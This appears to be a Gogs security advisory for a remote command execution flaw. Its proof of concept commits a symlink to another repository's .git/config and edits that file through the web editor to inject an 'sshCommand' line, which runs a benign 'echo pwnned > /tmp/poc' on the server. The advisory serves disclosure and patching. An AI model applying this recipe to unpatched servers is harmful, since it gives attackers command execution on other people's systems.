summary: "Remote Command Execution in file editing in gogs\n### Impact\n\nThe malicious user\
  \ is able to commit and edit a crafted symlink file to a repository to gain SSH access to\
  \ the server. \n\n### Patches\n\nEditing symlink while changing the file name has been prohibited\
  \ via the repository web editor (https://github.com/gogs/gogs/pull/7857). Users should upgrade\
  \ to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available,\
  \ please only grant access to trusted users to your Gogs instance on affected versions.\n\n\
  ### References\n\nn/a\n\n### Proof of Concept\n\n1. Create two repositories, upload something\
  \ to the first repository, edit any file, and save it on the webpage.\n2. In the second repository,\
  \ create a symbolic link to the file you need to edit:\n    ```bash\n    $ ln -s /data/gogs/data/tmp/local-repo/1/.git/config\
  \ test\n    $ ls -la\n    total 8\n    drwxr-xr-x   5 dd  staff  160 Oct 27 19:09 .\n    drwxr-xr-x\
  \   4 dd  staff  128 Oct 27 19:06 ..\n    drwxr-xr-x  12 dd  staff  384 Oct 27 19:09 .git\n\
  \    -rw-r--r--   1 dd  staff   12 Oct 27 19:06 README.md\n    lrwxr-xr-x   1 dd  staff  \
  \ 44 Oct 27 19:09 test -> /data/gogs/data/tmp/local-repo/1/.git/config\n    $ git add .\n\
  \    $ git commit -m 'ddd'\n    $ git push -f\n    ```\n\n3. Go back to the webpage, edit\
  \ the symbolic file in the second repository, with the following content, change the filename,\
  \ and save (here you can notice, with filename changed the symbolic file edit limit is bypassed)\n\
  \    ```\n    [core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n\
  \    logallrefupdates = true\n    ignorecase = true\n    precomposeunicode = true\n    sshCommand\
  \ = echo pwnned > /tmp/poc\n    [remote \"origin\"]\n    url = [git@github.com](mailto:git@github.com):torvalds/linux.git\n\
  \    fetch = +refs/heads/*:refs/remotes/origin/*\n    [branch \"master\"]\n    remote = origin\n\
  \    merge = refs/heads/master\n    ```\n\n4. Go back to the first repo, edit something, and\
  \ commit again, you can notice a file called `/tmp/poc` created on the server.\n\n### For\
  \ more information\nIf you have any questions or comments about this advisory, please post\
  \ on https://github.com/gogs/gogs/issues/7582."
